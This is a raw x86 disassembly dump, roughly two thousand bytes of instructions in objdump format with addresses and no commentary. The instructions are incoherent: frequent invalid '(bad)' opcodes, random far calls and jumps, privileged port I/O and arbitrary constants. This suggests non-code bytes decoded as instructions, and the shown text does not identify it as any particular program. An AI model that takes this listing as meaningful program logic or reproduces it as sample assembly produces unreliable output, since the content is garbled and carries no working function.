  41a4b8:	xchg   edi,eax
  41a4b9:	adc    DWORD PTR [edi+ebx*8-0x4],ecx
  41a4bd:	retf   0x9bb5
  41a4c0:	not    BYTE PTR [ebp+0x21a977e2]
  41a4c6:	push   ds
  41a4c7:	and    al,0x50
  41a4c9:	push   ecx
  41a4ca:	int3   
  41a4cb:	repnz mov edx,0x58f0fd44
  41a4d1:	xor    DWORD PTR [edi-0x5de76dbd],edx
  41a4d7:	call   0xcb49:0x254fadf2
  41a4de:	les    edi,FWORD PTR [ecx]
  41a4e0:	and    eax,0x8cbdbc70
  41a4e5:	mov    bh,BYTE PTR [ecx-0x7d64e9c4]
  41a4eb:	es push eax
  41a4ed:	in     al,dx
  41a4ee:	fisttp WORD PTR [ebp-0x54302a7c]
  41a4f4:	call   0x3db6:0xe3a41105
  41a4fb:	into   
  41a4fc:	rcr    BYTE PTR [ebp-0x676491c1],0x88
  41a503:	sub    ebp,ecx
  41a505:	nop
  41a506:	sub    ah,BYTE PTR [edx-0x4ed8c376]
  41a50c:	push   esi
  41a50d:	xchg   esp,eax
  41a50e:	dec    edx
  41a50f:	(bad)  
  41a510:	sbb    eax,0x6bb2a241
  41a515:	jecxz  0x41a4ef
  41a517:	jg     0x41a4a3
  41a519:	pop    esp
  41a51a:	xchg   DWORD PTR [edx],eax
  41a51c:	cs call 0xc1eeb7eb
  41a522:	inc    BYTE PTR [edi-0x5f]
  41a525:	or     ebp,esp
  41a527:	xor    DWORD PTR [esi-0x7],ecx
  41a52a:	sti    
  41a52b:	push   esp
  41a52c:	imul   ebx,DWORD PTR [ecx],0xffffffd9
  41a52f:	bound  ebx,QWORD PTR [ecx-0x12]
  41a532:	adc    al,al
  41a534:	aam    0x76
  41a536:	inc    edi
  41a537:	sub    ecx,DWORD PTR ds:0x2768f60d
  41a53d:	mov    bl,0xe6
  41a53f:	mov    eax,0x3d4dcfd0
  41a544:	(bad)  [edx-0x6b]
  41a547:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a548:	rcr    DWORD PTR [esi-0x35],cl
  41a54b:	dec    eax
  41a54c:	cmp    DWORD PTR [edx+0x24b6c9fa],esi
  41a552:	or     DWORD PTR [edi],eax
  41a554:	ins    BYTE PTR es:[edi],dx
  41a555:	scas   eax,DWORD PTR es:[edi]
  41a556:	retf   
  41a557:	mov    WORD PTR [esi+ebx*4-0x6b],cs
  41a55b:	inc    edx
  41a55c:	cmp    edi,DWORD PTR [eax-0x552cba1c]
  41a562:	dec    edi
  41a563:	mov    ah,0xbd
  41a565:	inc    DWORD PTR [edx+eiz*4-0x66cfe6f0]
  41a56c:	add    edx,eax
  41a56e:	sbb    DWORD PTR [ebx+0x377cf6b3],ebx
  41a574:	pop    edi
  41a575:	ds nop
  41a577:	out    dx,eax
  41a578:	shr    BYTE PTR [eax],1
  41a57a:	(bad)  
  41a57b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a57c:	xor    bh,BYTE PTR [eax-0x63c9cee7]
  41a582:	(bad)  
  41a585:	mov    BYTE PTR [eax+0x2d],cl
  41a588:	ins    DWORD PTR es:[edi],dx
  41a589:	cmp    al,0xf
  41a58b:	shr    DWORD PTR [edx+0x59245772],0xb0
  41a592:	push   ebx
  41a593:	add    ebx,DWORD PTR [esi-0x7e996838]
  41a599:	(bad)  
  41a59a:	jmp    FWORD PTR [edx+esi*4-0x7e330ace]
  41a5a1:	out    0x0,al
  41a5a3:	xchg   ecx,eax
  41a5a4:	cmp    eax,0xe49edc96
  41a5a9:	sub    al,0x17
  41a5ab:	xchg   esp,eax
  41a5ac:	dec    edi
  41a5ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5af:	xor    eax,0xf8e573bc
  41a5b4:	outs   dx,DWORD PTR ds:[esi]
  41a5b5:	sbb    eax,0xedd8f3c5
  41a5ba:	fwait
  41a5bb:	cld    
  41a5bc:	je     0x41a55b
  41a5be:	clc    
  41a5bf:	sub    DWORD PTR [edx+0x5bee1518],ebp
  41a5c5:	mov    cl,0x27
  41a5c7:	call   0x93426b5f
  41a5cc:	push   cs
  41a5cd:	fnstenv [edi-0x3633ee71]
  41a5d3:	retf   
  41a5d4:	add    ecx,DWORD PTR [edx]
  41a5d6:	call   0x65d4:0x941901eb
  41a5dd:	leave  
  41a5de:	jo     0x41a598
  41a5e0:	fst    QWORD PTR [ebp-0x1974a3e6]
  41a5e7:	add    DWORD PTR [edi],0xffffffcb
  41a5ea:	(bad)  
  41a5eb:	dec    esi
  41a5ec:	in     eax,0xe1
  41a5ee:	sbb    BYTE PTR [eax],bh
  41a5f0:	adc    cl,dh
  41a5f2:	(bad)  
  41a5f3:	in     eax,dx
  41a5f4:	or     BYTE PTR [ebp-0x6ab5fbf9],ch
  41a5fa:	stos   BYTE PTR es:[edi],al
  41a5fb:	or     eax,0x36de7418
  41a600:	or     DWORD PTR [esi],edi
  41a602:	ja     0x41a60b
  41a604:	jb     0x41a66b
  41a606:	lods   eax,DWORD PTR ds:[esi]
  41a607:	lea    ecx,[ecx+ebp*2]
  41a60a:	repnz sbb DWORD PTR [edi-0x1f67437f],ecx
  41a611:	(bad)  
  41a612:	dec    esp
  41a613:	aad    0x93
  41a615:	add    edi,eax
  41a617:	or     dl,bh
  41a619:	jge    0x41a5fc
  41a61b:	cwde   
  41a61c:	scas   eax,DWORD PTR es:[edi]
  41a61d:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41a61f:	or     BYTE PTR [ebp-0x31],dl
  41a622:	adc    ebp,DWORD PTR [edx-0x7c]
  41a625:	dec    esi
  41a626:	icebp  
  41a627:	add    eax,0xbc4662cd
  41a62c:	mov    eax,ds:0xf7284c27
  41a631:	(bad)  
  41a632:	fdivr  st,st(0)
  41a634:	scas   eax,DWORD PTR es:[edi]
  41a635:	inc    esp
  41a636:	cmp    DWORD PTR [edi],esp
  41a638:	push   edx
  41a639:	imul   DWORD PTR ds:0x4ab7a8a1
  41a63f:	ror    BYTE PTR [ecx],0xb7
  41a642:	les    esp,FWORD PTR [edx+edi*1+0x742b3ae3]
  41a649:	gs into 
  41a64b:	test   BYTE PTR ds:0x9bb5cc88,al
  41a651:	add    bl,BYTE PTR [ecx+0x4b173967]
  41a657:	daa    
  41a658:	lahf   
  41a659:	lea    edi,[ebx-0x1c]
  41a65c:	icebp  
  41a65d:	sub    eax,0x31cfadc8
  41a662:	sub    eax,0x7e26335d
  41a667:	xor    DWORD PTR [ebp-0x79],edx
  41a66a:	mov    ch,0xd1
  41a66c:	shr    DWORD PTR [ebx-0x4e],cl
  41a66f:	or     ch,BYTE PTR [esi]
  41a671:	or     cl,BYTE PTR [esi+edi*2]
  41a674:	fsubr  QWORD PTR [eax-0x3da96e25]
  41a67a:	stc    
  41a67b:	je     0x41a6c2
  41a67d:	aas    
  41a67e:	(bad)  
  41a67f:	lock sti 
  41a681:	mov    edi,gs
  41a683:	mov    edx,edx
  41a685:	retfw  
  41a687:	xor    al,0x52
  41a689:	add    dl,BYTE PTR [eax+0x2b]
  41a68c:	mov    ch,0x62
  41a68e:	loope  0x41a6f4
  41a690:	cwde   
  41a691:	lds    ebx,FWORD PTR [ebp+0x58]
  41a694:	inc    edi
  41a695:	mov    eax,ds:0x299aa834
  41a69a:	cmc    
  41a69b:	adc    DWORD PTR [ecx],0xffffffb2
  41a69e:	rcl    DWORD PTR [esi+0x48],0xb4
  41a6a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6a3:	mov    cl,0xb7
  41a6a5:	clc    
  41a6a6:	mov    ah,0xf4
  41a6a8:	pop    ecx
  41a6a9:	mov    ebp,0x746aa644
  41a6ae:	inc    esp
  41a6af:	mov    ds:0xb264f1,al
  41a6b4:	mov    ah,0x3e
  41a6b6:	sub    bh,dh
  41a6b8:	push   0xffffffc4
  41a6ba:	pusha  
  41a6bb:	add    eax,0xedeb3268
  41a6c0:	inc    esi
  41a6c1:	repz mov edi,0x787a497a
  41a6c7:	inc    edi
  41a6c8:	or     edi,esp
  41a6ca:	mov    cs,WORD PTR [ebx+0x5959b023]
  41a6d0:	jo     0x41a727
  41a6d2:	imul   edx,DWORD PTR [eax],0x41
  41a6d5:	push   esi
  41a6d6:	cdq    
  41a6d7:	mov    ds:0x677604a2,eax
  41a6dc:	mov    edx,edi
  41a6de:	jae    0x41a6be
  41a6e0:	outs   dx,DWORD PTR ds:[esi]
  41a6e1:	rcr    DWORD PTR [edi],0xd1
  41a6e4:	dec    edx
  41a6e5:	add    edx,edx
  41a6e7:	jb     0x41a670
  41a6e9:	or     bh,cl
  41a6eb:	cmp    esp,DWORD PTR [edi-0x48]
  41a6ee:	jb     0x41a711
  41a6f0:	or     bh,BYTE PTR [ecx-0x58]
  41a6f3:	ins    BYTE PTR es:[edi],dx
  41a6f4:	mov    BYTE PTR [eax-0x65211f51],0x51
  41a6fb:	mov    bl,0xbd
  41a6fd:	xchg   BYTE PTR [ebx],dl
  41a6ff:	ds xchg ebp,eax
  41a701:	cwde   
  41a702:	mov    cl,0x3d
  41a704:	mov    al,ds:0xfd9348cb
  41a709:	or     esi,esi
  41a70b:	loope  0x41a78c
  41a70d:	int    0xe4
  41a70f:	icebp  
  41a710:	mov    ch,0xbf
  41a712:	dec    esi
  41a713:	push   0x25
  41a715:	ret    
  41a716:	sub    bh,BYTE PTR [ecx-0x51]
  41a719:	mov    bl,0x19
  41a71b:	repz pop ss
  41a71d:	jp     0x41a742
  41a71f:	(bad)  
  41a720:	fdivr  QWORD PTR [edx+0x2af4e284]
  41a726:	inc    edi
  41a727:	inc    esp
  41a728:	pop    edx
  41a729:	mov    bl,0x1e
  41a72b:	call   FWORD PTR [ecx]
  41a72d:	ret    0x6523
  41a730:	or     BYTE PTR [eax-0x38fa0f57],cl
  41a736:	push   0xffffff81
  41a738:	clc    
  41a739:	xchg   BYTE PTR fs:[ebx],ah
  41a73c:	jnp    0x41a70b
  41a73e:	stos   BYTE PTR es:[edi],al
  41a73f:	or     BYTE PTR [ecx],ah
  41a741:	dec    esp
  41a742:	jne    0x41a7a9
  41a744:	or     eax,0x8dda7da5
  41a749:	jae    0x41a787
  41a74b:	(bad)  
  41a74c:	popf   
  41a74d:	dec    eax
  41a74e:	push   0x4f
  41a750:	adc    DWORD PTR [edx+eax*4-0x22a3ab8c],edx
  41a757:	scas   al,BYTE PTR es:[edi]
  41a758:	test   al,0x50
  41a75a:	(bad)  
  41a75b:	scas   al,BYTE PTR es:[edi]
  41a75c:	push   esp
  41a75d:	rol    DWORD PTR [esi-0xc],0xec
  41a761:	in     eax,dx
  41a762:	cli    
  41a763:	dec    edi
  41a764:	xchg   ebx,eax
  41a765:	mov    ch,0xc2
  41a767:	outs   dx,DWORD PTR ds:[esi]
  41a768:	sbb    ah,dl
  41a76a:	xchg   edi,eax
  41a76b:	push   esi
  41a76c:	xchg   DWORD PTR [ebx-0x2834821f],ebx
  41a772:	in     al,dx
  41a773:	gs (bad) 
  41a775:	push   ds
  41a776:	push   0xffffffab
  41a778:	or     al,0x5e
  41a77a:	xor    eax,0x8cf7f142
  41a77f:	fadd   DWORD PTR [edi-0x6f]
  41a782:	mov    bh,BYTE PTR [esi+0x71bb7428]
  41a788:	mov    edx,0xe469b21d
  41a78d:	mov    WORD PTR [ebx+0x6],cs
  41a790:	(bad)  
  41a791:	gs dec esi
  41a793:	popf   
  41a794:	and    eax,0xbbf5e1ae
  41a799:	dec    edi
  41a79a:	sbb    al,BYTE PTR [ebx+0x15]
  41a79d:	fwait
  41a79e:	stos   BYTE PTR es:[edi],al
  41a79f:	push   es
  41a7a0:	idiv   DWORD PTR [ebp-0x2998d916]
  41a7a6:	cbw    
  41a7a8:	dec    ecx
  41a7a9:	fucompp 
  41a7ab:	lds    esi,FWORD PTR [ebx]
  41a7ad:	xchg   DWORD PTR [ecx+0x54],ebp
  41a7b0:	test   al,0x6f
  41a7b2:	or     esp,DWORD PTR [ebp+ecx*1+0x1d29531a]
  41a7b9:	mov    ?,WORD PTR [ebx-0x30]
  41a7bc:	xor    BYTE PTR [ebp-0x7],ch
  41a7bf:	pop    ecx
  41a7c0:	mov    dh,0x53
  41a7c2:	add    eax,0xe0066eeb
  41a7c7:	ror    DWORD PTR [edx+0x513053ac],1
  41a7cd:	fiadd  WORD PTR [ebp+0x74]
  41a7d0:	pop    es
  41a7d1:	sub    cl,ah
  41a7d3:	xor    eax,0x285ff416
  41a7d8:	cmc    
  41a7d9:	dec    esi
  41a7da:	add    edi,DWORD PTR [ebx+0x6454413f]
  41a7e0:	jae    0x41a784
  41a7e2:	push   cs
  41a7e3:	or     eax,0x962e1a4e
  41a7e8:	ins    BYTE PTR es:[edi],dx
  41a7e9:	test   edi,0x87330a80
  41a7ef:	cmp    DWORD PTR [ebx+0x3b],esp
  41a7f2:	sbb    eax,0xb3834a4f
  41a7f7:	and    al,0xba
  41a7f9:	mov    cl,0xbb
  41a7fb:	lea    esp,[esi-0x6c]
  41a7fe:	imul   esp,eax,0x39b8430f
  41a804:	sbb    BYTE PTR [esi-0xc0c6c5b],bl
  41a80a:	test   BYTE PTR [edx],dl
  41a80c:	or     eax,0xd6115375
  41a811:	or     BYTE PTR [eax],cl
  41a813:	cld    
  41a814:	dec    edi
  41a815:	mov    ds:0xcd4c867b,eax
  41a81a:	mov    cl,BYTE PTR [eax]
  41a81c:	jg     0x41a86c
  41a81e:	jbe    0x41a81e
  41a820:	out    dx,al
  41a821:	in     eax,0xfa
  41a823:	push   edi
  41a824:	call   0x6b90388c
  41a829:	fsubr  QWORD PTR [esi-0x7a]
  41a82c:	or     al,0x34
  41a82e:	imul   edx,esp,0x75e4b2a2
  41a834:	ret    0x51d1
  41a837:	mov    ds:0x971283dd,eax
  41a83c:	and    edx,DWORD PTR [edx]
  41a83e:	(bad)  
  41a83f:	aaa    
  41a840:	dec    ecx
  41a841:	aas    
  41a842:	push   cs
  41a843:	xor    DWORD PTR [edi+0x49f7fc1f],edx
  41a849:	jo     0x41a866
  41a84b:	and    eax,0x56818803
  41a850:	push   0x3c74cc85
  41a855:	push   edi
  41a856:	mov    ebx,ebx
  41a858:	pop    edx
  41a859:	mov    esp,0x1dba8431
  41a85e:	(bad)  
  41a85f:	mov    edx,0x84274057
  41a864:	jmp    0x6af4:0x20d5f10f
  41a86b:	leave  
  41a86c:	bound  ebp,QWORD PTR [eax+edi*2]
  41a86f:	enter  0xe0e0,0x29
  41a873:	and    esp,edi
  41a875:	data16 aam 0xa8
  41a878:	xchg   esp,eax
  41a879:	fwait
  41a87a:	push   0x73a6cd03
  41a87f:	cs or  ecx,0xea7e17fd
  41a886:	outs   dx,BYTE PTR ds:[esi]
  41a887:	fstp   QWORD PTR [edx+eax*1+0x1713ec11]
  41a88e:	sar    BYTE PTR fs:[edx-0x13e5f1c9],1
  41a895:	jle    0x41a897
  41a897:	mov    ds:0xd235b7b0,eax
  41a89c:	loop   0x41a915
  41a89e:	aam    0xee
  41a8a0:	stos   DWORD PTR es:[edi],eax
  41a8a1:	in     eax,0xf6
  41a8a3:	sub    BYTE PTR [esi+esi*1-0x715eeb3e],dl
  41a8aa:	ins    DWORD PTR es:[edi],dx
  41a8ab:	cmp    DWORD PTR [esi-0x80],esp
  41a8ae:	dec    eax
  41a8af:	fwait
  41a8b0:	loope  0x41a8f3
  41a8b2:	rol    BYTE PTR ds:0x4dba7981,1
  41a8b8:	adc    ah,BYTE PTR [edi+0x46]
  41a8bb:	std    
  41a8bc:	pop    ss
  41a8bd:	hlt    
  41a8be:	cmp    cl,BYTE PTR [edi+eax*2+0x3c505ab1]
  41a8c5:	mov    DWORD PTR [eax-0x503c0a2d],ebx
  41a8cb:	(bad)  
  41a8cc:	in     eax,dx
  41a8cd:	jns    0x41a8bf
  41a8cf:	int    0xa5
  41a8d1:	loop   0x41a8b5
  41a8d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8d4:	xchg   ecx,eax
  41a8d5:	add    BYTE PTR [eax-0x66],al
  41a8d8:	fiadd  DWORD PTR [esi]
  41a8da:	fsub   st(7),st
  41a8dc:	xchg   ebx,edi
  41a8de:	xor    al,0xef
  41a8e0:	and    BYTE PTR [edi-0x70],ch
  41a8e3:	xchg   edi,eax
  41a8e4:	int    0xe
  41a8e6:	shl    BYTE PTR [ebx+eax*8-0x3d5e8b47],cl
  41a8ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8ee:	sbb    DWORD PTR [eax-0xf36d052],0x6c2cf70d
  41a8f8:	mov    edi,ss
  41a8fa:	push   0xa232b504
  41a8ff:	ret    0x8d98
  41a902:	xor    BYTE PTR [eax+0x8fff3fa],bl
  41a908:	ret    
  41a909:	add    BYTE PTR [ecx],0xf0
  41a90c:	inc    esi
  41a90d:	repz add BYTE PTR [ebp-0x8],al
  41a911:	nop
  41a912:	mov    ds:0x6ed88880,eax
  41a917:	pop    esi
  41a918:	mov    eax,0x2764e07c
  41a91d:	pop    ebx
  41a91e:	push   cs
  41a91f:	pop    eax
  41a920:	jmp    0x85335dfb
  41a925:	cmp    DWORD PTR [eax+0x74],ecx
  41a928:	dec    edx
  41a929:	iret   
  41a92a:	xchg   esi,eax
  41a92b:	inc    esp
  41a92c:	cmc    
  41a92d:	sar    BYTE PTR ds:0xdce52e6e,cl
  41a933:	mov    edi,0x34044923
  41a938:	ror    ecx,cl
  41a93a:	jg     0x41a8fb
  41a93c:	or     DWORD PTR [eax-0x777a6531],esp
  41a942:	dec    edi
  41a943:	popa   
  41a944:	(bad)  
  41a945:	test   al,0x2d
  41a947:	or     eax,0x3266ebad
  41a94c:	inc    ebp
  41a94d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a94e:	cs fs push esi
  41a951:	aam    0x21
  41a953:	fnstenv [ebx-0x28]
  41a956:	cmc    
  41a957:	sbb    eax,0x6c0aa126
  41a95c:	bound  esp,QWORD PTR [edx+0x58]
  41a95f:	dec    edx
  41a960:	fst    QWORD PTR [eax]
  41a962:	jl     0x41a8f5
  41a964:	ja     0x41a974
  41a966:	shr    BYTE PTR [edi*8+0x4a3fde56],0x7
  41a96e:	and    BYTE PTR [edi-0x4f569ec3],dh
  41a974:	fcmovu st,st(4)
  41a976:	sti    
  41a977:	shr    BYTE PTR [eax],cl
  41a979:	jbe    0x41a9e3
  41a97b:	mov    al,ds:0xfda73d0a
  41a980:	ficomp DWORD PTR [edi+0x73]
  41a983:	test   al,0x54
  41a985:	push   esp
  41a986:	push   edi
  41a987:	jo     0x41a98c
  41a989:	mov    al,ds:0x65163ad8
  41a98e:	shr    BYTE PTR [edi-0x16d2ef7f],0x36
  41a995:	sub    eax,0xb9b170c1
  41a99a:	iret   
  41a99b:	test   DWORD PTR [edx],0x31e52243
  41a9a1:	(bad)  
  41a9a2:	or     DWORD PTR [ebx-0x7e],ebx
  41a9a5:	shl    DWORD PTR [ebx-0x32998737],0x47
  41a9ac:	inc    edx
  41a9ad:	outs   dx,DWORD PTR ds:[esi]
  41a9ae:	neg    DWORD PTR [esi]
  41a9b0:	xor    eax,0x7a8372fb
  41a9b5:	fisttp QWORD PTR [edi+0x7a7a4c8b]
  41a9bb:	in     eax,0x77
  41a9bd:	dec    ebx
  41a9be:	das    
  41a9bf:	push   eax
  41a9c0:	arpl   WORD PTR [ebp-0x179c440c],ax
  41a9c6:	test   DWORD PTR [ebx-0x3389e376],eax
  41a9cc:	cmc    
  41a9cd:	shl    DWORD PTR [ebp-0x2950ef75],1
  41a9d3:	push   ds
  41a9d4:	inc    ebp
  41a9d5:	mov    cl,0xe0
  41a9d7:	jecxz  0x41a9b1
  41a9d9:	cmp    ecx,DWORD PTR [ecx+0x7a]
  41a9dc:	jnp    0x41aa36
  41a9de:	jbe    0x41a98d
  41a9e0:	ja     0x41a9ed
  41a9e2:	cwde   
  41a9e3:	scas   eax,DWORD PTR es:[edi]
  41a9e4:	push   ecx
  41a9e5:	sbb    eax,0x6665ffa4
  41a9ea:	sar    esi,1
  41a9ec:	sbb    DWORD PTR [edi-0x62],edi
  41a9ef:	or     DWORD PTR [ebx+eiz*8+0x65],ebx
  41a9f3:	in     eax,0xad
  41a9f5:	inc    esi
  41a9f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9f7:	repnz mov cl,0x3f
  41a9fa:	pop    ss
  41a9fb:	inc    ebx
  41a9fc:	xchg   esp,eax
  41a9fd:	dec    ebx
  41a9fe:	push   ebx
  41a9ff:	jge    0x41a9f6
  41aa01:	or     DWORD PTR [edi+0x12],edi
  41aa04:	jg     0x41a9cb
  41aa06:	xor    al,0xd5
  41aa08:	mov    bh,0x84
  41aa0a:	mov    ah,0xae
  41aa0c:	pop    ds
  41aa0d:	mov    ds:0x1c3b1a33,eax
  41aa12:	inc    DWORD PTR [edi]
  41aa14:	add    al,0xe4
  41aa16:	push   edi
  41aa17:	lahf   
  41aa18:	ds jge 0x41aa45
  41aa1b:	sbb    BYTE PTR [edi+edx*4-0x62],bh
  41aa1f:	cmp    eax,0xa9a39c44
  41aa24:	jle    0x41aa3d
  41aa26:	cwde   
  41aa27:	lea    ebp,[eax]
  41aa29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa2a:	outs   dx,BYTE PTR ds:[esi]
  41aa2b:	shl    DWORD PTR [edx+0x64a3635d],0x27
  41aa32:	xchg   esi,eax
  41aa33:	mov    edx,0xa95dbac3
  41aa38:	mulps  xmm4,XMMWORD PTR [edi+0x61b192ea]
  41aa3f:	out    dx,eax
  41aa40:	cmp    eax,0xfedc3852
  41aa45:	mov    WORD PTR [ecx-0x7a],es
  41aa48:	cmp    esi,DWORD PTR [edx-0x1e9f7c0a]
  41aa4e:	aaa    
  41aa4f:	fcmovnbe st,st(4)
  41aa51:	fsub   st(4),st
  41aa53:	mov    eax,ds:0x15ee6874
  41aa58:	repz sbb DWORD PTR [eax-0x3b],edx
  41aa5c:	xor    eax,0xb7ee9300
  41aa61:	mov    ch,0x9b
  41aa63:	test   BYTE PTR [ebp+ebp*8-0x64],ch
  41aa67:	gs or  al,bh
  41aa6a:	ret    0x6bdd
  41aa6d:	out    0xaa,eax
  41aa6f:	and    bl,bh
  41aa71:	mov    bh,0xd9
  41aa73:	mov    edi,0x98d3ee65
  41aa78:	cmovle ecx,ebx
  41aa7b:	sbb    eax,DWORD PTR [ebx+0x34cfbfc0]
  41aa81:	mov    DWORD PTR [eax-0x4bc0db16],esp
  41aa87:	jb     0x41aa40
  41aa89:	stc    
  41aa8a:	dec    eax
  41aa8b:	push   0xffffffa0
  41aa8d:	jp     0x41aa1b
  41aa8f:	push   di
  41aa91:	into   
  41aa92:	xchg   esp,eax
  41aa93:	mov    dh,0x22
  41aa95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa96:	sbb    eax,0x74a75c39
  41aa9b:	and    al,0xfa
  41aa9d:	push   ecx
  41aa9e:	mov    dl,0xeb
  41aaa0:	bound  eax,QWORD PTR [edx]
  41aaa2:	pop    esi
  41aaa3:	gs nop
  41aaa5:	stos   BYTE PTR es:[edi],al
  41aaa6:	call   0xc913:0x624942d2
  41aaad:	out    dx,al
  41aaae:	and    BYTE PTR [si-0x43],dh
  41aab2:	mov    edx,DWORD PTR [ecx+ebp*4]
  41aab5:	push   cs
  41aab6:	jae    0x41ab24
  41aab8:	ja     0x41aa6e
  41aaba:	pop    es
  41aabb:	sub    al,0x7
  41aabd:	dec    ebp
  41aabe:	aam    0xe5
  41aac0:	add    al,0xfd
  41aac2:	sbb    ebp,eax
  41aac4:	or     eax,DWORD PTR [ebp+0x47]
  41aac7:	jno    0x41ab1d
  41aac9:	inc    eax
  41aacb:	push   0xffffffe6
  41aacd:	dec    ebp
  41aace:	mov    BYTE PTR [esi+0x3ec1caf5],al
  41aad4:	sbb    al,0x37
  41aad6:	sti    
  41aad7:	jo     0x41aae7
  41aad9:	xchg   edi,eax
  41aada:	pop    ds
  41aadb:	fwait
  41aadc:	(bad)  
  41aadd:	adc    dh,bl
  41aadf:	cli    
  41aae0:	mov    ah,0x31
  41aae2:	fwait
  41aae3:	test   eax,0x4f4e7b15
  41aae8:	adc    ecx,DWORD PTR [ebp+0x7c]
  41aaeb:	sar    BYTE PTR [ebp-0x57],cl
  41aaee:	mov    eax,ds:0xf686d03d
  41aaf3:	push   esp
  41aaf4:	fbstp  TBYTE PTR [edx+eiz*1+0x31b99d4f]
  41aafb:	lahf   
  41aafc:	inc    edi
  41aafd:	imul   DWORD PTR [esi-0x11831368]
  41ab03:	mov    cl,0x9a
  41ab05:	jp     0x41ab21
  41ab07:	cwde   
  41ab08:	nop
  41ab09:	ja     0x41aab7
  41ab0b:	div    cl
  41ab0d:	psadbw mm7,QWORD PTR [ecx]
  41ab10:	(bad)  
  41ab11:	(bad)  
  41ab12:	je     0x41ab1c
  41ab14:	call   0x19a7:0x32a59ef
  41ab1b:	lahf   
  41ab1c:	addr16 push ebx
  41ab1e:	mov    ds:0xdac5abbc,eax
  41ab23:	or     ch,BYTE PTR [esi]
  41ab25:	sbb    ebp,eax
  41ab27:	data16 test BYTE PTR [edi+0x50276410],ch
  41ab2e:	bound  ecx,QWORD PTR [esi-0x7d196078]
  41ab34:	iret   
  41ab35:	mov    BYTE PTR [ebp+ebx*8-0x5b],cl
  41ab39:	inc    ebx
  41ab3a:	outs   dx,BYTE PTR ds:[esi]
  41ab3b:	icebp  
  41ab3c:	dec    ecx
  41ab3d:	mov    al,0xce
  41ab3f:	mov    ch,0xb1
  41ab41:	clc    
  41ab42:	iret   
  41ab43:	adc    al,0xe2
  41ab45:	shr    DWORD PTR [edx+0x57],cl
  41ab48:	outs   dx,DWORD PTR ds:[esi]
  41ab49:	fsubr  DWORD PTR [ebx]
  41ab4b:	retf   0xaad0
  41ab4e:	cmp    ch,BYTE PTR [ebx]
  41ab50:	push   eax
  41ab51:	leave  
  41ab52:	xchg   ebp,eax
  41ab53:	test   al,0x21
  41ab55:	add    ebx,edx
  41ab57:	sbb    ebx,edi
  41ab59:	lods   al,BYTE PTR ds:[esi]
  41ab5a:	xchg   esi,eax
  41ab5b:	ins    DWORD PTR es:[edi],dx
  41ab5c:	pop    ss
  41ab5d:	jnp    0x41ab08
  41ab5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab60:	stos   BYTE PTR es:[edi],al
  41ab61:	iret   
  41ab62:	mov    ah,0xf6
  41ab64:	out    dx,al
  41ab65:	jno    0x41abe1
  41ab67:	pop    ebx
  41ab68:	and    eax,0xc9845b44
  41ab6d:	es fwait
  41ab6f:	lods   al,BYTE PTR ds:[esi]
  41ab70:	mov    ah,0xa
  41ab72:	or     ecx,DWORD PTR [eax+0x2a]
  41ab75:	sbb    eax,0x530d588a
  41ab7a:	call   0x20d7575b
  41ab7f:	les    ecx,FWORD PTR [eax+0x8]
  41ab82:	xchg   ebp,eax
  41ab83:	std    
  41ab84:	push   edx
  41ab85:	mov    DWORD PTR [ebx+0x65323396],ecx
  41ab8b:	jecxz  0x41aba1
  41ab8d:	imul   eax,DWORD PTR ds:0xb3e87b0a,0xf9c7a2a9
  41ab97:	push   esp
  41ab98:	cmp    BYTE PTR [edi],dl
  41ab9a:	mov    eax,ds:0x696d6133
  41ab9f:	inc    ebp
  41aba0:	push   ebx
  41aba1:	cmp    DWORD PTR [ebx-0x28],eax
  41aba4:	mov    al,BYTE PTR [eax-0xc915b70]
  41abaa:	aam    0xf6
  41abac:	or     al,0x6
  41abae:	fst    QWORD PTR [esi+0x1a]
  41abb1:	cmp    esi,esp
  41abb3:	pop    es
  41abb4:	(bad)  
  41abb5:	push   0xffffffe7
  41abb7:	cmp    eax,0xb4951b68
  41abbc:	stos   BYTE PTR es:[edi],al
  41abbd:	rcl    edi,cl
  41abbf:	mov    ecx,0x4c08cca
  41abc4:	jbe    0x41ac05
  41abc6:	xchg   dl,cl
  41abc8:	daa    
  41abc9:	sbb    eax,0x762fa347
  41abce:	sbb    dh,BYTE PTR [esi+0x2f60ed02]
  41abd4:	(bad)  
  41abd5:	or     al,dh
  41abd7:	fnstsw WORD PTR [edi]
  41abd9:	add    eax,0x91aabd07
  41abde:	das    
  41abdf:	jbe    0x41ac05
  41abe1:	into   
  41abe2:	rcl    ah,1
  41abe4:	mov    al,ds:0x76b9c66a
  41abe9:	push   es
  41abea:	and    ecx,esp
  41abec:	or     eax,0xd4fd29ec
  41abf1:	cdq    
  41abf2:	hlt    
  41abf3:	pusha  
  41abf4:	cdq    
  41abf5:	push   edi
  41abf6:	lock cmc 
  41abf8:	jle    0x41ac54
  41abfa:	bound  ebp,QWORD PTR [edi-0x16]
  41abfd:	or     al,0x90
  41abff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac00:	sub    DWORD PTR [esp+edx*1],esp
  41ac03:	add    dh,bl
  41ac05:	out    0xb7,al
  41ac07:	jmp    0xed3d:0x35ad8064
  41ac0e:	loope  0x41ac0d
  41ac10:	xor    bh,bl
  41ac12:	mov    al,ds:0x14dfec83
  41ac17:	dec    eax
  41ac18:	mov    cl,0x70
  41ac1a:	stos   DWORD PTR es:[edi],eax
  41ac1b:	mov    ebp,0x9fa19316
  41ac20:	gs mov dl,0x7f
  41ac23:	or     BYTE PTR [ecx+ecx*1],bh
  41ac26:	(bad)  
  41ac27:	mov    edi,0x8ab1c9d5
  41ac2c:	mov    al,ds:0xdefd630d
  41ac31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac32:	outs   dx,BYTE PTR ds:[esi]
  41ac33:	bound  eax,QWORD PTR [ecx]
  41ac35:	fs int 0x55
  41ac38:	rol    DWORD PTR [esp+ebx*1],0x52
  41ac3c:	retf   
